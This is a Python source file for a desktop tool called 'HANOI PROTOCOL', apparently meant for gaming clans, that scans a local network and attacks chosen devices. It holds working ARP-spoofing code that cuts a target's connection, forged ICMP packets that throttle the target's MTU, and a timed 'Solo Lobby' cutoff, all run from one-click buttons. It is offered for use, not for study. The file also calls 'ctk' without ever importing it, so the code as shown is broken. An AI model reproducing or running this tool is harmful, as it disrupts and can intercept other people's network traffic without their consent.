import os
import time
import threading
import socket
import sys
import ctypes
import json
import logging
from scapy.all import ARP, Ether, IP, ICMP, srp, sendp, conf
# Configure Appearance
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.user32.MessageBoxW(0, "This application requires Administrative privileges.\n\nPlease restart your terminal as Administrator.", "ADMIN REQUIRED", 0)
    sys.exit(1)

# --- Application State ---
state = {
    "scanning": False,
    "gateway_ip": "",
    "subnet": "192.168.1.0/24",
    "iface": None,
    "devices": [], # list of dicts: {'ip': str, 'mac': str}
    "active_attacks": {}, # dict of ip: threading.Event()
    "active_mtu_limits": {}, # dict of ip: {'event': threading.Event(), 'val': int}
    "solo_lobby_active": False,
    "solo_lobby_expires": 0,
    "nicknames": {}, # dict of mac: str
    "favorites": {}  # dict of mac: {"ip": str, "mac": str}
}

NICKNAMES_FILE = 'nicknames.json'
FAVORITES_FILE = 'favorites.json'

try:
    if os.path.exists(NICKNAMES_FILE):
        with open(NICKNAMES_FILE, 'r') as f:
            state["nicknames"] = json.load(f)
except Exception as e:
    print(f"[!] Failed to load nicknames: {e}")

try:
    if os.path.exists(FAVORITES_FILE):
        with open(FAVORITES_FILE, 'r') as f:
            state["favorites"] = json.load(f)
except Exception as e:
    print(f"[!] Failed to load favorites: {e}")

def get_default_network_info():
    try:
        iface, local_ip, gw_ip = conf.route.route("0.0.0.0")
        subnet = f"{local_ip.rsplit('.', 1)[0]}.0/24"
        return gw_ip, subnet, iface
    except:
        return "192.168.1.1", "192.168.1.0/24", conf.iface

state["gateway_ip"], state["subnet"], state["iface"] = get_default_network_info()

# --- Backend Network Logic ---
def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=state["iface"], timeout=2, verbose=0)
        if ans: return ans[0][1].hwsrc
    except: pass
    return None

def spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac: return
        while not stop_event.is_set():
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
            time.sleep(2)
    except: pass

def mtu_loop(target_ip, gateway_ip, mtu_limit, stop_event):
    try:
        target_mac = get_mac(target_ip)
        if not target_mac: return
        
        while not stop_event.is_set():
            try:
                icmp = ICMP(type=3, code=4, nexthopmtu=int(mtu_limit))
            except:
                icmp = ICMP(type=3, code=4, unused=int(mtu_limit))
                
            pkt = Ether(dst=target_mac)/IP(src=gateway_ip, dst=target_ip)/icmp/IP(src=target_ip, dst=gateway_ip)
            sendp(pkt, iface=state["iface"], verbose=0)
            time.sleep(1)
    except Exception as e:
        print(f"[!] MTU Limit error: {e}")

def run_arp_scan(subnet):
    state["scanning"] = True
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), iface=state["iface"], timeout=5, retry=1, verbose=0)
        
        found_devices = []
        for s, r in ans:
            if r.psrc != state["gateway_ip"]:
                found_devices.append({"ip": r.psrc, "mac": r.hwsrc})
        
        # Inject favorites so they are accessible without responding to the scan
        found_macs = {d["mac"] for d in found_devices}
        for mac, dev in state["favorites"].items():
            if mac not in found_macs:
                found_devices.append({"ip": dev["ip"], "mac": mac})
                
        state["devices"] = found_devices
    except Exception as e:
        print(f"[!] Scan error: {e}")
    finally:
        state["scanning"] = False

def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
    state["solo_lobby_active"] = True
    state["solo_lobby_expires"] = time.time() + (float(duration_ms) / 1000.0)
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac: return
        
        stop_event = threading.Event()
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
        while time.time() < state["solo_lobby_expires"]:
            time.sleep(0.05)
            
        stop_event.set()
        
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
            
    except Exception as e:
        print(f"[!] Timed cut error: {e}")
    finally:
        state["solo_lobby_active"] = False
        state["solo_lobby_expires"] = 0

# --- GUI Application ---
class NetNexusApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("HANOI PROTOCOL // CLAN NETWORK TOOL")
        self.geometry("900x600")
        
        self.current_sort_col = "ip"
        self.sort_desc = False
        
        # Grid layout
        self.grid_rowconfigure(2, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        # 1. Header Frame
        self.header_frame = ctk.CTkFrame(self)
        self.header_frame.grid(row=0, column=0, padx=20, pady=20, sticky="ew")
        
        self.title_lbl = ctk.CTkLabel(self.header_frame, text="HANOI PROTOCOL", font=ctk.CTkFont(family="Orbitron", size=24, weight="bold"), text_color="#00ffd1")
        self.title_lbl.grid(row=0, column=0, padx=20, pady=15)
        
        self.subnet_var = ctk.StringVar(value=state["subnet"])
        self.subnet_lbl = ctk.CTkLabel(self.header_frame, text="Subnet:")
        self.subnet_lbl.grid(row=0, column=1, padx=5)
        self.subnet_entry = ctk.CTkEntry(self.header_frame, textvariable=self.subnet_var, width=120)
        self.subnet_entry.grid(row=0, column=2, padx=5)
        
        self.gateway_var = ctk.StringVar(value=state["gateway_ip"])
        self.gateway_lbl = ctk.CTkLabel(self.header_frame, text="Gateway:")
        self.gateway_lbl.grid(row=0, column=3, padx=5)
        self.gateway_entry = ctk.CTkEntry(self.header_frame, textvariable=self.gateway_var, width=120)
        self.gateway_entry.grid(row=0, column=4, padx=5)
        
        self.scan_btn = ctk.CTkButton(self.header_frame, text="Scan Network", command=self.start_scan)
        self.scan_btn.grid(row=0, column=5, padx=20)
        
        self.search_var = ctk.StringVar()
        self.search_entry = ctk.CTkEntry(self.header_frame, textvariable=self.search_var, placeholder_text="Search IP, Mac, Nick...", width=150)
        self.search_entry.grid(row=0, column=6, padx=5)
        self.search_var.trace_add("write", lambda *args: self.populate_table())
        
        self.show_favorites_var = ctk.BooleanVar(value=False)
        self.show_favorites_checkbox = ctk.CTkCheckBox(self.header_frame, text="Favorites Only", variable=self.show_favorites_var, command=self.populate_table)
        self.show_favorites_checkbox.grid(row=0, column=7, padx=5)
        
        # 2. Solo Lobby Banner (Hidden initially)
        self.banner_frame = ctk.CTkFrame(self, fg_color="#7f1d1d", border_width=2, border_color="#ef4444")
        self.banner_lbl = ctk.CTkLabel(self.banner_frame, text="Solo Lobby Active: 12.0s", font=ctk.CTkFont(size=20, weight="bold"), text_color="#fca5a5")
        self.banner_lbl.pack(pady=10)
        
        # 3. Device Table (Scrollable Frame)
        self.table_frame = ctk.CTkScrollableFrame(self)
        self.table_frame.grid(row=2, column=0, padx=20, pady=(0, 20), sticky="nsew")
        self.table_frame.grid_columnconfigure((0,1,2,3,4,5,6,7), weight=1)
        
        self.header_widgets = {}
        headers = [("fav", "Fav"), ("ip", "IP Address"), ("mac", "MAC Address"), ("vendor", "Vendor"), 
                   ("nickname", "Nickname"), ("is_cut", "Status"), ("actions", "Actions")]
                   
        for i, (col_id, h) in enumerate(headers):
            if col_id == "actions":
                lbl = ctk.CTkLabel(self.table_frame, text=h, font=ctk.CTkFont(weight="bold"))
                lbl.grid(row=0, column=i, padx=5, pady=5, sticky="w")
            else:
                btn = ctk.CTkButton(self.table_frame, text=h, fg_color="transparent", text_color="white", 
                                    font=ctk.CTkFont(weight="bold"), anchor="w", hover_color="#374151",
                                    command=lambda c=col_id: self.set_sort(c))
                btn.grid(row=0, column=i, padx=5, pady=5, sticky="w")
                self.header_widgets[col_id] = btn
            
        self.device_rows = []
        
        # Start UI Update Loop
        self.update_sort_icons()
        self.after(100, self.update_ui)
        self.populate_table()
        
    def set_sort(self, col):
        if self.current_sort_col == col:
            self.sort_desc = not self.sort_desc
        else:
            self.current_sort_col = col
            self.sort_desc = False
        self.update_sort_icons()
        self.populate_table()
        
    def update_sort_icons(self):
        titles = {
            "fav": "Fav", "ip": "IP Address", "mac": "MAC Address", "vendor": "Vendor", 
            "nickname": "Nickname", "is_cut": "Status"
        }
        for col_id, btn in self.header_widgets.items():
            base_text = titles[col_id]
            if col_id == self.current_sort_col:
                btn.configure(text=f"{base_text} {'▼' if self.sort_desc else '▲'}")
            else:
                btn.configure(text=base_text)

    def start_scan(self):
        if not state["scanning"]:
            state["subnet"] = self.subnet_var.get()
            state["gateway_ip"] = self.gateway_var.get()
            state["devices"] = []
            self.scan_btn.configure(state="disabled", text="Scanning...")
            threading.Thread(target=run_arp_scan, args=(state["subnet"],), daemon=True).start()
            self.populate_table()

    def update_nickname_var(self, mac, str_var):
        state["nicknames"][mac] = str_var.get()
        try:
            with open(NICKNAMES_FILE, 'w') as f:
                json.dump(state["nicknames"], f)
        except Exception as e:
            print(f"[!] Failed to save nickname: {e}")
            
    def toggle_favorite(self, mac, ip):
        if mac in state["favorites"]:
            del state["favorites"][mac]
        else:
            state["favorites"][mac] = {"ip": ip, "mac": mac}
            
        try:
            with open(FAVORITES_FILE, 'w') as f:
                json.dump(state["favorites"], f)
        except Exception as e:
            print(f"[!] Failed to save favorites: {e}")
            
        self.populate_table()
        
    def toggle_cut(self, ip):
        gateway_ip = state["gateway_ip"]
        if ip == gateway_ip: return
        
        if ip in state["active_attacks"]:
            state["active_attacks"][ip].set()
            del state["active_attacks"][ip]
        else:
            stop_event = threading.Event()
            state["active_attacks"][ip] = stop_event
            threading.Thread(target=spoof_loop, args=(ip, gateway_ip, stop_event), daemon=True).start()
        self.populate_table()
        
    def toggle_mtu(self, ip, time_var):
        gateway_ip = state["gateway_ip"]
        if ip == gateway_ip: return
        
        if ip in state["active_mtu_limits"]:
            state["active_mtu_limits"][ip]['event'].set()
            del state["active_mtu_limits"][ip]
        else:
            try:
                mtu_val = int(time_var.get())
            except ValueError:
                mtu_val = 800
            stop_event = threading.Event()
            state["active_mtu_limits"][ip] = {'event': stop_event, 'val': mtu_val}
            threading.Thread(target=mtu_loop, args=(ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
        self.populate_table()

    def trigger_solo_lobby(self, ip, time_var):
        if not state["solo_lobby_active"] and ip != state["gateway_ip"]:
            try:
                duration_ms = int(time_var.get())
            except ValueError:
                duration_ms = 8000
            threading.Thread(target=timed_intercept_logic, args=(ip, state["gateway_ip"], duration_ms), daemon=True).start()

    def populate_table(self):
        # Clear existing rows
        for row in self.device_rows:
            for widget in row:
                if widget: widget.destroy()
        self.device_rows.clear()
        
        if not state["devices"] and not state["scanning"]:
            lbl = ctk.CTkLabel(self.table_frame, text="No devices found. Run a scan.", text_color="gray")
            lbl.grid(row=1, column=0, columnspan=6, pady=20)
            self.device_rows.append([lbl])
            return

        # Filter logic
        search_q = self.search_var.get().lower()
        show_favs = self.show_favorites_var.get()
        filtered_devices = []
        for dev in state["devices"]:
            if show_favs and dev["mac"] not in state["favorites"]:
                continue
            nick = state["nicknames"].get(dev["mac"], "").lower()
            if not search_q or \
               search_q in dev["ip"].lower() or \
               search_q in dev["mac"].lower() or \
               search_q in nick:
                filtered_devices.append(dev)

        # Sorting logic
        def sort_key(dev):
            if self.current_sort_col == "ip":
                return tuple(int(part) for part in dev["ip"].split('.'))
            elif self.current_sort_col == "nickname":
                return state["nicknames"].get(dev["mac"], "").lower()
            elif self.current_sort_col == "is_cut":
                return dev["ip"] in state["active_attacks"]
            elif self.current_sort_col == "fav":
                return dev["mac"] in state["favorites"]
            return dev.get(self.current_sort_col, "").lower()
            
        sorted_devices = sorted(filtered_devices, key=sort_key, reverse=self.sort_desc)

        for r_idx, dev in enumerate(sorted_devices, start=1):
            is_fav = dev["mac"] in state["favorites"]
            fav_text = "★" if is_fav else "☆"
            fav_color = "#fbbf24" if is_fav else "gray"
            fav_btn = ctk.CTkButton(self.table_frame, text=fav_text, width=30, fg_color="transparent", text_color=fav_color, hover_color="#374151", font=("Arial", 16),
                                    command=lambda m=dev["mac"], i=dev["ip"]: self.toggle_favorite(m, i))
            fav_btn.grid(row=r_idx, column=0, padx=2, pady=5)
            
            ip_lbl = ctk.CTkLabel(self.table_frame, text=dev["ip"], font=("Share Tech Mono", 13))
            ip_lbl.grid(row=r_idx, column=1, padx=5, pady=5, sticky="w")
            
            mac_lbl = ctk.CTkLabel(self.table_frame, text=dev["mac"], font=("Share Tech Mono", 12), text_color="gray")
            mac_lbl.grid(row=r_idx, column=2, padx=5, pady=5, sticky="w")
            
            # Nickname Entry
            nick_var = ctk.StringVar(value=state["nicknames"].get(dev["mac"], ""))
            nick_entry = ctk.CTkEntry(self.table_frame, textvariable=nick_var, width=150)
            nick_entry.grid(row=r_idx, column=3, padx=5, pady=5, sticky="w")
            nick_var.trace_add("write", lambda name, index, mode, m=dev["mac"], v=nick_var: self.update_nickname_var(m, v))
            
            # Status Badge
            is_cut = dev["ip"] in state["active_attacks"] or state["solo_lobby_active"]
            status_text = "OFFLINE" if is_cut else "ONLINE"
            status_color = "#ff003c" if is_cut else "#00ffd1"
            
            is_mtu = dev["ip"] in state["active_mtu_limits"]
            if is_mtu:
                status_text += f"\nMTU: {state['active_mtu_limits'][dev['ip']]['val']}"
                
            status_lbl = ctk.CTkLabel(self.table_frame, text=status_text, text_color=status_color, font=("Rajdhani", 12, "bold"))
            status_lbl.grid(row=r_idx, column=4, padx=5, pady=5, sticky="w")
            
            # Action Frame
            action_frame = ctk.CTkFrame(self.table_frame, fg_color="transparent")
            action_frame.grid(row=r_idx, column=5, padx=5, pady=5, sticky="w")
            
            # Top: Cut Connection
            cut_text = "Restore" if is_cut else "Cut Connection"
            cut_color = "#4b5563" if is_cut else "#dc2626"
            cut_btn = ctk.CTkButton(action_frame, text=cut_text, width=100, fg_color=cut_color,
                                    command=lambda ip=dev["ip"]: self.toggle_cut(ip))
            cut_btn.grid(row=0, column=0, columnspan=2, pady=2, sticky="ew")
            
            # Middle: MTU Limiter
            mtu_val = state["active_mtu_limits"][dev["ip"]]["val"] if is_mtu else 800
            mtu_var = ctk.StringVar(value=str(mtu_val))
            mtu_entry = ctk.CTkEntry(action_frame, textvariable=mtu_var, width=60)
            mtu_entry.grid(row=1, column=0, padx=2, pady=2, sticky="w")
            
            mtu_text = "Stop MTU" if is_mtu else "Limit MTU"
            mtu_color = "#d97706" if is_mtu else "#ca8a04"
            mtu_btn = ctk.CTkButton(action_frame, text=mtu_text, width=80, fg_color=mtu_color,
                command=lambda ip=dev["ip"], tv=mtu_var: self.toggle_mtu(ip, tv))
            mtu_btn.grid(row=1, column=1, padx=2, pady=2, sticky="w")
            
            # Bottom: Solo Lobby
            time_var = ctk.StringVar(value="8000")
            time_entry = ctk.CTkEntry(action_frame, textvariable=time_var, width=60)
            time_entry.grid(row=2, column=0, padx=2, pady=2, sticky="w")
            
            solo_btn = ctk.CTkButton(action_frame, text="GHOST", width=80, fg_color="#4f46e5",
                command=lambda ip=dev["ip"], tv=time_var: self.trigger_solo_lobby(ip, tv))
            solo_btn.grid(row=2, column=1, padx=2, pady=2, sticky="w")
            
            self.device_rows.append([fav_btn, ip_lbl, mac_lbl, nick_entry, status_lbl, action_frame, cut_btn, solo_btn])

    def update_ui(self):
        # Update Scan button
        if state["scanning"]:
            self.scan_btn.configure(state="disabled", text="Scanning...")
        else:
            self.scan_btn.configure(state="normal", text="Scan Network")
            # If scanning just finished but table is empty, populate it
            if len(state["devices"]) > 0 and len(self.device_rows) <= 1:
                self.populate_table()
            
        # Update Banner
        if state["solo_lobby_active"]:
            self.banner_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
            remaining = max(0, state['solo_lobby_expires'] - time.time())
            self.banner_lbl.configure(text=f"Solo Lobby Active: {remaining:.3f}s")
        else:
            self.banner_frame.grid_forget()
            
        # Update connection status labels dynamically
        search_q = self.search_var.get().lower()
        show_favs = self.show_favorites_var.get()
        filtered_devices = []
        for dev in state["devices"]:
            if show_favs and dev["mac"] not in state["favorites"]:
                continue
            nick = state["nicknames"].get(dev["mac"], "").lower()
            if not search_q or search_q in dev["ip"].lower() or search_q in dev["mac"].lower() or search_q in nick:
                filtered_devices.append(dev)
                
        def sort_key(dev):
            if self.current_sort_col == "ip":
                return tuple(int(part) for part in dev["ip"].split('.'))
            elif self.current_sort_col == "fav":
                return dev["mac"] in state["favorites"]
            return dev.get(self.current_sort_col, "").lower()
                
        sorted_devices = sorted(filtered_devices, key=sort_key, reverse=self.sort_desc)
        
        for r_idx, dev in enumerate(sorted_devices):
                if r_idx < len(self.device_rows) and len(self.device_rows[r_idx]) == 8:
                    solo_btn = self.device_rows[r_idx][7]
                else:
                    continue
                if state["solo_lobby_active"]:
                    solo_btn.configure(state="disabled")
                else:
                    solo_btn.configure(state="normal")
                
                is_cut = dev["ip"] in state["active_attacks"] or state["solo_lobby_active"]
                is_mtu = dev["ip"] in state["active_mtu_limits"]
                
                status_text = "Disconnected" if is_cut else "Connected"
                if is_mtu:
                    status_text += f"\nMTU: {state['active_mtu_limits'][dev['ip']]['val']}"
                    
                status_color = "#ff003c" if is_cut else "#00ffd1"
                status_lbl = self.device_rows[r_idx][4]
                status_lbl.configure(text=status_text, text_color=status_color)

        self.after(30, self.update_ui)

if __name__ == "__main__":
    app = NetNexusApp()
    app.mainloop()
